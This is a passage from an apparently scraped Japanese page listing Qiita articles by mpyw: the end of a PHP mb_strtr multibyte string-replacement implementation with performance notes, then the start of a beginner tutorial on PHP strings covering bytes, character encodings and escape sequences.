    <span class="k">return</span> <span class="nb">strtr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$replace_pairs</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<p>エンコーディングが壊れていてもそのまま処理します。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">全エンコーディング対応版シグネチャ</span></div>
<div class="highlight"><pre><span></span>string mb_strtr ( string $str , string $from , string $to [, string $encoding] )
string mb_strtr ( string $str , array $replace_pairs [, string $encoding] )
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">全エンコーディング対応版コード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">mb_strtr</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$args</span> <span class="o">=</span> <span class="nb">func_get_args</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$from</span><span class="p">,</span> <span class="nv">$to</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">;</span>
        <span class="nv">$encoding</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">:</span> <span class="nb">mb_internal_encoding</span><span class="p">();</span> 
        <span class="nv">$replace_pairs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$k</span> <span class="o">=</span> <span class="nb">mb_substr</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">);</span>
            <span class="nv">$v</span> <span class="o">=</span> <span class="nb">mb_substr</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">);</span>
            <span class="nv">$replace_pairs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$replace_pairs</span> <span class="o">?</span> <span class="nx">mb_strtr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$replace_pairs</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">list</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$replace_pairs</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">;</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">mb_regex_encoding</span><span class="p">();</span>
    <span class="nb">mb_regex_encoding</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">:</span> <span class="nb">mb_internal_encoding</span><span class="p">());</span>
    <span class="nb">uksort</span><span class="p">(</span><span class="nv">$replace_pairs</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">-</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="p">});</span>
    <span class="nv">$from</span> <span class="o">=</span> <span class="nv">$to</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$replace_pairs</span> <span class="k">as</span> <span class="nv">$f</span> <span class="o">=&gt;</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$from</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'('</span> <span class="o">.</span> <span class="nb">mb_ereg_replace</span><span class="p">(</span><span class="s1">'[.\\\\+*?\\[^$(){}|]'</span><span class="p">,</span> <span class="s1">'\\\\0'</span><span class="p">,</span> <span class="nv">$f</span><span class="p">)</span> <span class="o">.</span> <span class="s1">')'</span><span class="p">;</span>
            <span class="nv">$to</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mb_ereg_replace_callback</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$from</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$to</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$to</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$from</span><span class="p">[</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$t</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">},</span> <span class="nv">$str</span><span class="p">);</span>
    <span class="nb">mb_regex_encoding</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>エンコーディングが壊れていてもそのまま処理します。<br>
<strong>PHP5.4.1</strong> 以降のみ対応。</p>

<h2>
<span id="備考" class="fragment"></span><a href="#%E5%82%99%E8%80%83"><i class="fa fa-link"></i></a>備考</h2>

<p>なお文字列置換関数に関して、動作の軽い順に</p>

<ul>
<li>
<code>strtr()</code> (引数3つ)</li>
<li>
<code>str_replace()</code> (配列を含まない)</li>
<li>
<code>str_replace()</code> (配列を含む)</li>
<li>
<code>strtr()</code> (引数2つ)</li>
</ul>

<p>――超えられない壁――</p>

<ul>
<li>
<code>strtr_utf8()</code> (引数2つ)</li>
<li>
<code>strtr_utf8()</code> (引数3つ)</li>
</ul>

<p>――超えられない壁――</p>

<ul>
<li>
<code>mb_str_replace()</code> (配列を含まない)</li>
<li>
<code>mb_strtr()</code> (引数2つ)</li>
<li>
<code>mb_str_replace()</code> (配列を含む)</li>
<li>
<code>mb_strtr()</code> (引数3つ)</li>
</ul>

<p>だいたいこんな感じのパフォーマンス順位になると思います。<br>
正確なことは検証してないので分かりませんが。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />34位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>33</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/d61b50d90e84e289e2be"> 【PHP入門講座】 文字列</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-27 17:12:25</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-04010ecaaaea55709a6b">目次に戻る</a>
</h3>

<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a>前書き</h1>

<p>すっ飛ばしてきた部分をちゃんと補填するため、いよいよ本格的に言語構造について詳しく学んでいきます。 <strong>「あ、ここってこういうことだったのか！」</strong> と納得していただける点があれば嬉しい限りです。</p>

<h1>
<span id="phpでの文字列" class="fragment"></span><a href="#php%E3%81%A7%E3%81%AE%E6%96%87%E5%AD%97%E5%88%97"><i class="fa fa-link"></i></a>PHPでの「文字列」</h1>

<h2>
<span id="2進数-8進数-16進数とは" class="fragment"></span><a href="#2%E9%80%B2%E6%95%B0-8%E9%80%B2%E6%95%B0-16%E9%80%B2%E6%95%B0%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>2進数, 8進数, 16進数とは</h2>

<p>私たちが日頃触っている数字は <strong>10進数</strong> です。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">10進数</span></div>
<div class="highlight"><pre><span></span>0, 1, 2, 3, 4, 5, 6, 7, 8, 9
</pre></div>
</div>

<p>と<ins>10個</ins>1桁の数字が続いた後、 <code>10</code> というように2桁の領域に入りますよね。この事から<ins>10進数</ins>と呼ばれます。10進数以外のものは以下のようになります。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">2進数</span></div>
<div class="highlight"><pre><span></span>0, 1
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">8進数</span></div>
<div class="highlight"><pre><span></span>0, 1, 2, 3, 4, 5, 6, 7
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">16進数</span></div>
<div class="highlight"><pre><span></span>0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F
</pre></div>
</div>

<p>16進数に関しては、アルファベットを導入して2桁で表現できる領域を拡張しています。ポケモンをやり込んでいる人ならば、個体値の範囲を表すのに使っている</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">32進数</span></div>
<div class="highlight"><pre><span></span>0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V
</pre></div>
</div>

<p>の概念も分かるはずですね（笑）</p>

<h2>
<span id="1ビットとは" class="fragment"></span><a href="#1%E3%83%93%E3%83%83%E3%83%88%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>1ビットとは</h2>

<p><strong>0</strong> か <strong>1</strong> かを表す情報のことです。2進数の1桁に相当します。</p>

<h2>
<span id="1バイトとは" class="fragment"></span><a href="#1%E3%83%90%E3%82%A4%E3%83%88%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>1バイトとは</h2>

<p><strong>1バイト＝ 8ビット</strong> というように定義されています。2進数だと8桁に相当します。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">2進数で表した1バイトの範囲</span></div>
<div class="highlight"><pre><span></span>00000000 ～ 11111111
</pre></div>
</div>

<p>これだと見にくいので、10進数や16進数がよく用いられます。ここでは0以上の整数のみを対象にする <strong>符号無し整数</strong> の考え方が適用されます。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">8進数で表した1バイトの範囲</span></div>
<div class="highlight"><pre><span></span>000 ～ 377
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">10進数で表した1バイトの範囲</span></div>
<div class="highlight"><pre><span></span>000 ～ 255
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">16進数で表した1バイトの範囲</span></div>
<div class="highlight"><pre><span></span>00 ～ FF
</pre></div>
</div>

<h2>
<span id="phpで言う文字とは何か" class="fragment"></span><a href="#php%E3%81%A7%E8%A8%80%E3%81%86%E6%96%87%E5%AD%97%E3%81%A8%E3%81%AF%E4%BD%95%E3%81%8B"><i class="fa fa-link"></i></a>PHPで言う「文字」とは何か</h2>

<p>1バイトを使って表されるもののことです。<ins>文字の最小単位は1バイト</ins>です。これより小さく切り分けることは出来ません。まずは最も基本的な1バイトコード、別名 <strong>ASCIIコード</strong> について触れます。以下のリンクを参照してください。</p>

<p><strong>ASCII文字コード ： IT用語辞典</strong><br>
<a href="http://e-words.jp/p/r-ascii.html" class="autolink" rel="nofollow noopener" target="_blank">http://e-words.jp/p/r-ascii.html</a></p>

<p>簡単にグループ分けすると、</p>

<ul>
<li>半角数字</li>
<li>半角アルファベット</li>
<li>半角記号</li>
<li>制御用の特殊文字</li>
</ul>

<p>この4つに分けることが出来ます。</p>

<p>しかしこれだけだと、日本語・韓国語・中国語・ロシア語・アラビア語などを扱うことは当然出来ませんよね？そこで<ins>1～2バイト並べて1文字を表現</ins>しようという発想に帰着することになります。 <strong>Shift_JIS</strong> や <strong>EUC-JP</strong> などは日本語専用の文字コードですが、Webページの国際対応が重要な今、日本語しか用いることが出来ないというのは致命的な欠点ですよね。</p>

<p>そこで <strong>UTF-8</strong> という、<ins>全ての言語に対応した</ins>文字コードが登場してきました。現在ではWebページの80%以上がこのコードで書かれていると言われています。UTF-8では<ins>1～4バイト並べて1文字を表現</ins>します。当然1文字あたりのサイズは先に述べた日本語専用のコードよりも多く必要としますが、情報通信速度が向上し、記憶領域が大量に確保できるようになった今の時代であるからこそ、受け入れられるものと考えられるでしょう。あとで理由も記述しますが、<ins>PHPの一般的な関数はUTF-8しか正しく扱うことが出来ません</ins>。よって今からPHPでプログラミングを行うならば、UTF-8を選択しない理由は無いと言っても過言ではないでしょう。UTF-8コード表を示しますので、以下のリンクを参照してください。</p>

<p><strong>UTF-8コード表(1)</strong><br>
<a href="http://www.seiai.ed.jp/sys/text/java/utf8table.html" class="autolink" rel="nofollow noopener" target="_blank">http://www.seiai.ed.jp/sys/text/java/utf8table.html</a><br>
<strong>UTF-8コード表(2)</strong><br>
<a href="http://www.seiai.ed.jp/sys/text/java/utf8table2.html" class="autolink" rel="nofollow noopener" target="_blank">http://www.seiai.ed.jp/sys/text/java/utf8table2.html</a></p>

<p>例えば <code>あ</code> は16進数表記で <code>E3</code> <code>81</code> <code>82</code> として3バイトで表されます。</p>

<h2>
<span id="phpで言う文字列とは何か" class="fragment"></span><a href="#php%E3%81%A7%E8%A8%80%E3%81%86%E6%96%87%E5%AD%97%E5%88%97%E3%81%A8%E3%81%AF%E4%BD%95%E3%81%8B"><i class="fa fa-link"></i></a>PHPで言う「文字列」とは何か</h2>

<p><ins>文字が並べられたもの</ins>のことを指します。例えば <code>あ</code> <code>い</code> は16進数表記で<code>E3</code> <code>81</code> <code>82</code> <code>E3</code> <code>81</code> <code>83</code> として6バイトで表されます。しかし、厳密にはこれだけでは説明不足です。このページ内の「PHPの文字列にはどんなバイトコードも入れられる」にてその理由を説明しています。</p>

<h2>
<span id="エスケープ文字-" class="fragment"></span><a href="#%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E6%96%87%E5%AD%97-"><i class="fa fa-link"></i></a>エスケープ文字 <code>\</code>
</h2>

<p>さて、また <strong>エスケープ</strong> という言葉が出てきました。一番最初に</p>

<blockquote>
<p>... この処理を、HTML特殊文字を <strong>「エスケープする」</strong>  といいます。一口にエスケープするといっても様々なエスケープがあり、<ins>何のためにエスケープするのかが重要</ins>です。</p>
</blockquote>

<p>と述べましたが、ここでは違う意味のエスケープを扱います。まず、</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>2種類のクオートを書きます。「"」「'」
</pre></div></div>

<p>と出力するコードを書いてみます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'2種類のクオートを書きます。「"」「'</span><span class="nx">」</span><span class="err">'</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"2種類のクオートを書きます。「"</span><span class="nx">」「</span><span class="err">'</span><span class="nx">」</span><span class="s2">";</span>
</pre></div></div>

<p>何やらQiita上で文法エラーを示す赤枠が出ていますね。当然です、文字列を括る文字自体を文字として出力しようとしているのですから。ここでエスケープを行います。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'2種類のクオートを書きます。「"」「\'」'</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"2種類のクオートを書きます。「</span><span class="se">\"</span><span class="s2">」「'」"</span><span class="p">;</span>
</pre></div></div>

<p>こうすると正しく表示することが出来ます。<code>\\</code> という文字は、<ins>後ろに来る文字の扱いを変える</ins>役割を持ちます。このような特殊な文字を <strong>メタ文字</strong> といいます。メタ文字である <code>\\</code> 自身を表したいときは、 <code>\\\\</code> として2つ連ねればOKです。なお、今回行った <code>\\</code> によるエスケープは、<ins>PHPコードのためのエスケープ</ins>です。エスケープは幅広い意味を持つ語句なので、目的をしっかり押さえておきましょう。</p>

<h2>
<span id="文字をバイトコードから指定する" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E3%82%92%E3%83%90%E3%82%A4%E3%83%88%E3%82%B3%E3%83%BC%E3%83%89%E3%81%8B%E3%82%89%E6%8C%87%E5%AE%9A%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>文字をバイトコードから指定する</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'K'</span><span class="p">;</span>
</pre></div></div>

<p>このコードで出力される内容は、先ほどのASCIIコード表によれば、</p>

<ul>
<li>文字 → <code>K</code>
</li>
<li>8進数コード → <code>113</code>
</li>
<li>16進数コード → <code>4B</code>
</li>
</ul>

<p>となります。ここで別の方法も考えてみましょう。PHP言語では <ins><code>"</code> を用いた場合に限り、バイトコードを直接記述することが出来ます</ins>。具体的な記述方法を下に示します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"</span><span class="se">\113</span><span class="s2">"</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"</span><span class="se">\x4B</span><span class="s2">"</span><span class="p">;</span>
</pre></div></div>

<p>8進数コードは <code>\\</code> に続けて入力します。16進数コードは <code>\\x</code> に続けて入力します。この「x」は6を表す「HEX」から来ています。先ほどの <code>あ</code> の例ならば、</p>

<ul>
<li>文字 → <code>あ</code>
</li>
<li>8進数コード → <code>343</code> <code>201</code> <code>202</code>
</li>
<li>16進数コード → <code>E3</code> <code>81</code> <code>82</code>
</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"</span><span class="se">\343\201\202</span><span class="s2">"</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"</span><span class="se">\xE3\x81\x82</span><span class="s2">"</span><span class="p">;</span>
</pre></div></div>

<p>となります。</p>

<h2>
<span id="phpの文字列にはどんなバイトコードも入れられる" class="fragment"></span><a href="#php%E3%81%AE%E6%96%87%E5%AD%97%E5%88%97%E3%81%AB%E3%81%AF%E3%81%A9%E3%82%93%E3%81%AA%E3%83%90%E3%82%A4%E3%83%88%E3%82%B3%E3%83%BC%E3%83%89%E3%82%82%E5%85%A5%E3%82%8C%E3%82%89%E3%82%8C%E3%82%8B"><i class="fa fa-link"></i></a>PHPの文字列にはどんなバイトコードも入れられる</h2>

<p>突然ですが、UTF-8コード表に存在しないおかしなコードを出力してみましょう。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"</span><span class="se">\xE3\xE3\xE3</span><span class="s2">"</span><span class="p">;</span>
</pre></div></div>

<p>ブラウザによって表示は異なりますが、おそらく <code>◆</code> に <code>?</code> を載せたような文字が現れるでしょう。これはブラウザ側が <strong>コードを認識できなかった文字</strong> として処理した結果です。しかし今回問題にして欲しいのはそこではありません。<ins>文字列に文字として存在しないコードをセットできている</ins>ということです。つまり、PHPの「文字列」はどちらかと言えば <strong>「バイト列」</strong> と言うべきです。テキストファイルではない<ins>画像ファイルのデータなども文字列に格納できてしまう</ins>のです。</p>

<h1>
<span id="文字列の表記法とエスケープシーケンス" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E8%A1%A8%E8%A8%98%E6%B3%95%E3%81%A8%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>文字列の表記法とエスケープシーケンス</h1>

<p><code>\\\\</code> や <code>\xE3</code> などの1つ1つのまとまりは <strong>エスケープシーケンス</strong> と呼ばれます。PHPには4種類の<br>
文字列表記法がありますが、それぞれに適用されるエスケープシーケンスは異なります。</p>

<h2>
<span id="シングルクオート--内" class="fragment"></span><a href="#%E3%82%B7%E3%83%B3%E3%82%B0%E3%83%AB%E3%82%AF%E3%82%AA%E3%83%BC%E3%83%88--%E5%86%85"><i class="fa fa-link"></i></a>シングルクオート <code>'</code> 内</h2>

<p>一番基本的なタイプです。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$var</span> <span class="o">=</span> <span class="s1">'文字列'</span><span class="p">;</span>
</pre></div></div>

<table>
<thead>
<tr>
<th style="text-align: center">記述</th>
<th style="text-align: center">実際の表示</th>
<th style="text-align: center">意味</th>
<th style="text-align: center">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center"><strong><code>\\\\</code></strong></td>
<td style="text-align: center">*<em>\*</em>
</td>
<td style="text-align: center">バックスラッシュ</td>
<td style="text-align: center">直後にシングルクオートがない場合は省略可能</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\\'</code></strong></td>
<td style="text-align: center"><strong>'</strong></td>
<td style="text-align: center">シングルクオート</td>
<td style="text-align: center"></td>
</tr>
</tbody>
</table>

<h4>
<span id="直後にシングルクオートがない場合は省略可能とは" class="fragment"></span><a href="#%E7%9B%B4%E5%BE%8C%E3%81%AB%E3%82%B7%E3%83%B3%E3%82%B0%E3%83%AB%E3%82%AF%E3%82%AA%E3%83%BC%E3%83%88%E3%81%8C%E3%81%AA%E3%81%84%E5%A0%B4%E5%90%88%E3%81%AF%E7%9C%81%E7%95%A5%E5%8F%AF%E8%83%BD%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>「直後にシングルクオートがない場合は省略可能」とは？</h4>

<p>以下の1番目、3番目(の一部)のようなケースを指します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'[a]\[b]'</span><span class="p">;</span> <span class="c1"># =&gt; [a]\[b]</span>
<span class="k">echo</span> <span class="s1">'[a]\\[b]'</span><span class="p">;</span> <span class="c1"># =&gt; [a]\[b]</span>
<span class="k">echo</span> <span class="s1">'[a]\\\[b]'</span><span class="p">;</span> <span class="c1"># =&gt; [a]\\[b]</span>
<span class="k">echo</span> <span class="s1">'[a]\\\\[b]'</span><span class="p">;</span> <span class="c1"># =&gt; [a]\\[b]</span>
<span class="k">echo</span> <span class="s1">'\\'</span><span class="p">;</span> <span class="c1"># =&gt; \</span>
<span class="k">echo</span> <span class="err">'</span><span class="nx">\</span><span class="err">'</span><span class="p">;</span> <span class="c1"># パースエラー</span>
</pre></div></div>

<p>慣れないうちは省略せずに全てエスケープすることをおすすめします。ちなみにこれはPHP言語に限っての挙動であり、 <strong>C言語</strong> や <strong>Java言語</strong> ではこのような挙動にはならず、<ins>必ずエスケープする必要があります</ins>。</p>

<h2>
<span id="ダブルクオート--内" class="fragment"></span><a href="#%E3%83%80%E3%83%96%E3%83%AB%E3%82%AF%E3%82%AA%E3%83%BC%E3%83%88--%E5%86%85"><i class="fa fa-link"></i></a>ダブルクオート <code>"</code> 内</h2>

<p>シングルクオートにさまざまなエスケープシーケンスが付加されたタイプです。変数の値を展開することもでき、用途はかなり広いです。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$var</span> <span class="o">=</span> <span class="s2">"文字列"</span><span class="p">;</span>
</pre></div></div>

<table>
<thead>
<tr>
<th style="text-align: center">記述</th>
<th style="text-align: center">実際の表示</th>
<th style="text-align: center">意味</th>
<th style="text-align: center">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center"><strong><code>\\\\</code></strong></td>
<td style="text-align: center">*<em>\*</em>
</td>
<td style="text-align: center">バックスラッシュ</td>
<td style="text-align: center">直後に他のエスケープ可能な文字がない場合は省略可能</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\\"</code></strong></td>
<td style="text-align: center">"</td>
<td style="text-align: center">ダブルクオート</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\\$</code></strong></td>
<td style="text-align: center">$</td>
<td style="text-align: center">ドル記号</td>
<td style="text-align: center">直後に変数名に使える文字がなければ省略可能</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\\n</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">ラインフィード(LF)</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\\r</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">キャリッジリターン(CR)</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\\t</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">水平タブ</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\\v</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">垂直タブ</td>
<td style="text-align: center">PHP5.2.5以降のみ</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\\e</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">エスケープ</td>
<td style="text-align: center">PHP5.4.0以降のみ</td>
</tr>
<tr>
<td style="text-align: center"><code>\113</code></td>
<td style="text-align: center">K</td>
<td style="text-align: center">8進数コード指定</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>\\x4B</code></td>
<td style="text-align: center">K</td>
<td style="text-align: center">16進数コード指定</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var}</code></td>
<td style="text-align: center">$var の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">
<code>${var}</code> と書くことも出来る</td>
</tr>
<tr>
<td style="text-align: center"><code>$var</code></td>
<td style="text-align: center">$var の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var[0]}</code></td>
<td style="text-align: center">$var[0] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">
<code>${var[0]}</code> と書くことも出来る</td>
</tr>
<tr>
<td style="text-align: center"><code>$var[0]</code></td>
<td style="text-align: center">$var[0] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var['hoge']}</code></td>
<td style="text-align: center">$var['hoge'] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">
<code>${var['hoge']}</code> と書くことも出来る<br>↓ との違いに注意</td>
</tr>
<tr>
<td style="text-align: center"><code>$var[hoge]</code></td>
<td style="text-align: center">$var['hoge'] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">↑ との違いに注意</td>
</tr>
</tbody>
</table>

<h2>
<span id="ヒアドキュメント内" class="fragment"></span><a href="#%E3%83%92%E3%82%A2%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88%E5%86%85"><i class="fa fa-link"></i></a>ヒアドキュメント内</h2>

<p>文字列中に <code>"</code> がいっぱい出てきてエスケープが面倒な時はこれを使いましょう。複数行に書かれた場合でも比較的美しく見せることが出来ます。但し、<ins>変数展開の機能だけは残されています</ins>。なお、<code>EOD</code> には記号以外の任意の文字列を入れることが出来ますが、 <code>EOD</code> ( <strong>End Of Document</strong> ) や <code>EOS</code> ( <strong>End Of Statement</strong> ) が用いられることが多いです。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$var</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOD</span><span class="s"></span>
<span class="s">1行目</span>
<span class="s">2行目</span>
